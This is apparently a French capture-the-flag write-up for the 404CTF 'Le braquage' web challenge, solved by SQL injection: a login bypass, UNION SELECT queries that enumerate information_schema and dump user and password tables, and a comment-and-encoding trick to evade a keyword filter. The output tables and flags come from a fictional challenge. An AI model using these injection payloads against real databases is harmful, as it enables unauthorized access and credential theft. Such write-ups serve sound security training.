> Vous êtes sur une affaire de cambriolage. D’après vos informations, un criminel surnommé TITI a prévu une rencontre avec ses complices pour préparer son prochain casse.
> 
> Heureusement, votre équipe est parvenu à trouver un site qu’ils utilisent. Ce site leur permet de communiquer et d’échanger des lieux de rendez-vous ainsi que des fausses identités. A vous d’exploiter cette base de données pour obtenir des informations sur le suspect et son opération : nom, prénom, adresse visée, date du casse, heure du casse, téléphone, mot de passe.
> 
> Les différents morceaux de flag sont sous la forme : 404CTF{Nom},404CTF{Prénom},404CTF{Adresse},404CTF{Date},404CTF{Heure},404CTF{Téléphone},404CTF{Mdp}

1. Sur https://le-braquage.404ctf.fr/scripts/page1.php:
- Identifiant: `' OR ''='`
- Pseudonyme: `ARKANYOTA`

```nushell
╭───┬─────────┬────────────┬────────────────────┬──────────────────────────┬───────────────────╮
│ # │ Id      │ Pseudonyme │ Téléphone          │ Adresse                  │ Code              │
├───┼─────────┼────────────┼────────────────────┼──────────────────────────┼───────────────────┤
│ 0 │ 1       │ RIRI       │ 0145489625         │ 5 avenue des groseilles  │ OpérationEpervier │
│ 1 │ 2       │ FIFI       │ 0145889625         │ 1 rue des myrtilles      │ OpérationFaucon   │
│ 2 │ 3       │ LOULOU     │ 0115789625         │ 1 rue des pommes         │ OpérationFaucon   │
│ 3 │ 456     │ JAJA       │ 0145769625         │ 1 rue des pommes         │ OpérationGorfou   │
│ 4 │ 472     │ RORO       │ 0189999625         │ 5 boulevard des poires   │ OpérationFaucon   │
│ 5 │ 7456    │ TITI       │ 404CTF{0145769456} │ 404CTF{21 rue des kiwis} │ OpérationGorfou   │
│ 6 │ 7865    │ DEDE       │ 0145781225         │ 3 avenue des oranges     │ OpérationMouette  │
│ 7 │ 16579   │ DIDI       │ 0145789625         │ 1 rue des pommes         │ OpérationEpervier │
╰───┴─────────┴────────────┴────────────────────┴──────────────────────────┴───────────────────╯
```

On a donc pour le moment `404CTF{Nom},404CTF{Prénom},404CTF{21 rue des kiwis},404CTF{Date},404CTF{Heure},404CTF{0145769456},404CTF{Mdp}` et Code = OpérationGorfou

2. Sur https://le-braquage.404ctf.fr/scripts/page2.php:
- Identifiant: `' OR ''='' UNION SELECT table_name, column_name FROM information_schema.columns WHERE ''='`

```nushell
╭────┬──────────────┬────────────────────────────────────────────────────────────────────╮
│ #  │    Pseudo    │                            Coopérative                             │
├────┼──────────────┼────────────────────────────────────────────────────────────────────┤
│  0 │ DEDE         │ Collaboration des négociants de minerais de Franche-Comté          │
│  1 │ DIDI         │ Association des vendeurs d'or de France                            │
│  2 │ FIFI         │ Corporation des fournisseurs de pierres précieuses d'Île-de-France │
│  3 │ JAJA         │ Regroupement des marchands de joyaux d'Ille-et-Vilaine             │
│  4 │ LOULOU       │ Association des vendeurs d'or de France                            │
│  5 │ RIRI         │ Association des vendeurs d'or de France                            │
│  6 │ RORO         │ Corporation des fournisseurs de pierres précieuses d'Île-de-France │
│  7 │ TITI         │ Regroupement des marchands de joyaux d'Ille-et-Vilaine             │
│  8 │ .            │ .                                                                  │
│  9 │ .            │ .                                                                  │
│ 10 │ .            │ .                                                                  │
│ 11 │ cooperatives │ pseudo                                                             │
│ 12 │ cooperatives │ cooperative                                                        │
│ 13 │ Users        │ id                                                                 │
│ 14 │ Users        │ nom                                                                │
│ 15 │ Users        │ prenom                                                             │
╰────┴──────────────┴────────────────────────────────────────────────────────────────────╯```
```

- Identifiant: `' OR ''='' UNION SELECT nom, prenom FROM Users WHERE ''='`

```nushell
╭────┬────────────────┬────────────────────────────────────────────────────────────────────╮
│ #  │     Pseudo     │                            Coopérative                             │
├────┼────────────────┼────────────────────────────────────────────────────────────────────┤
│  0 │ DEDE           │ Collaboration des négociants de minerais de Franche-Comté          │
│  1 │ DIDI           │ Association des vendeurs d'or de France                            │
│  2 │ FIFI           │ Corporation des fournisseurs de pierres précieuses d'Île-de-France │
│  3 │ JAJA           │ Regroupement des marchands de joyaux d'Ille-et-Vilaine             │
│  4 │ LOULOU         │ Association des vendeurs d'or de France                            │
│  5 │ RIRI           │ Association des vendeurs d'or de France                            │
│  6 │ RORO           │ Corporation des fournisseurs de pierres précieuses d'Île-de-France │
│  7 │ TITI           │ Regroupement des marchands de joyaux d'Ille-et-Vilaine             │
│  8 │ Assin          │ Marc                                                               │
│  9 │ Outan          │ Laurent                                                            │
│ 10 │ Gator          │ Ali                                                                │
│ 11 │ Reptile        │ Eric                                                               │
│ 12 │ Culé           │ Roland                                                             │
│ 13 │ 404CTF{Vereux} │ 404CTF{UnGorfou}                                                   │
│ 14 │ Abbé           │ Oscar                                                              │
│ 15 │ Conda          │ Anna                                                               │
╰────┴────────────────┴────────────────────────────────────────────────────────────────────╯
```

On a donc pour le moment `404CTF{Vereux},404CTF{UnGorfou},404CTF{21 rue des kiwis},404CTF{Date},404CTF{Heure},404CTF{0145769456},404CTF{Mdp}`

3. Sur https://le-braquage.404ctf.fr/scripts/page3.php:

- Code: `OpérationGorfou`
```nushell
╭───┬─────────────────┬────────────────────┬────────────────────╮
│ # │      Code       │        Date        │       Heure        │
├───┼─────────────────┼────────────────────┼────────────────────┤
│ 0 │ OpérationGorfou │ 404CTF{2022-07-14} │ 404CTF{01hDuMatin} │
╰───┴─────────────────┴────────────────────┴────────────────────╯
```
On a donc pour le moment `404CTF{Vereux},404CTF{UnGorfou},404CTF{21 rue des kiwis},404CTF{2022-07-14},404CTF{01hDuMatin},404CTF{0145769456},404CTF{Mdp}`

4. Sur https://le-braquage.404ctf.fr/scripts/page3.php:
> Doc: https://portswigger.net/support/sql-injection-bypassing-common-filters

- Code: `'OR''=''UNION/**/S%45lect/**/table_name,column_name,1/**/FROM/**/information_schema.columns/**/WHERE''='`
```nushell
╭────┬───────────────────┬────────────────────┬────────────────────╮
│ #  │       Code        │        Date        │       Heure        │
├────┼───────────────────┼────────────────────┼────────────────────┤
│  1 │ OpérationEpervier │ 2021-11-02         │ 19h                │
│  2 │ OpérationMouette  │ 2021-09-14         │ 19h                │
│  3 │ OpérationFaucon   │ 2022-01-01         │ 20h                │
│  4 │ OpérationGorfou   │ 404CTF{2022-07-14} │ 404CTF{01hDuMatin} │
│  5 │ .                 │ .                  │ 1                  │
│  6 │ .                 │ .                  │ 1                  │
│  7 │ .                 │ .                  │ 1                  │
│  8 │ Rdv               │ code               │ 1                  │
│  9 │ Rdv               │ dateRdv            │ 1                  │
│ 10 │ Rdv               │ heureRdv           │ 1                  │
│ 11 │ Password          │ id                 │ 1                  │
│ 12 │ Password          │ mdp                │ 1                  │
╰────┴───────────────────┴────────────────────┴────────────────────╯
```

- Code: `'OR''=''UNION/**/S%45lect/**/id,mdp,1/**/FROM/**/Password/**/WHERE''='`

```nushell
╭────┬───────────────────┬──────────────────────────┬────────────────────╮
│ #  │       Code        │           Date           │       Heure        │
├────┼───────────────────┼──────────────────────────┼────────────────────┤
│  1 │ OpérationEpervier │ 2021-11-02               │ 19h                │
│  2 │ OpérationMouette  │ 2021-09-14               │ 19h                │
│  3 │ OpérationFaucon   │ 2022-01-01               │ 20h                │
│  4 │ OpérationGorfou   │ 404CTF{2022-07-14}       │ 404CTF{01hDuMatin} │
│  5 │ 1                 │ d7uA9kYU3                │ 1                  │
│  6 │ 2                 │ 5qKrD4F7p                │ 1                  │
│  7 │ 3                 │ SXq3rZ35v                │ 1                  │
│  8 │ 456               │ FGp4Q93tk                │ 1                  │
│  9 │ 472               │ qJB5y45Xe                │ 1                  │
│ 10 │ 7456              │ 404CTF{GorfousAuPouvoir} │ 1                  │
│ 11 │ 7865              │ S5eN2p5Wj                │ 1                  │
│ 12 │ 16579             │ T3h98HdFy                │ 1                  │
╰────┴───────────────────┴──────────────────────────┴────────────────────╯
```

| `404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}` |
|-------------------------------------------------------------------------------------|
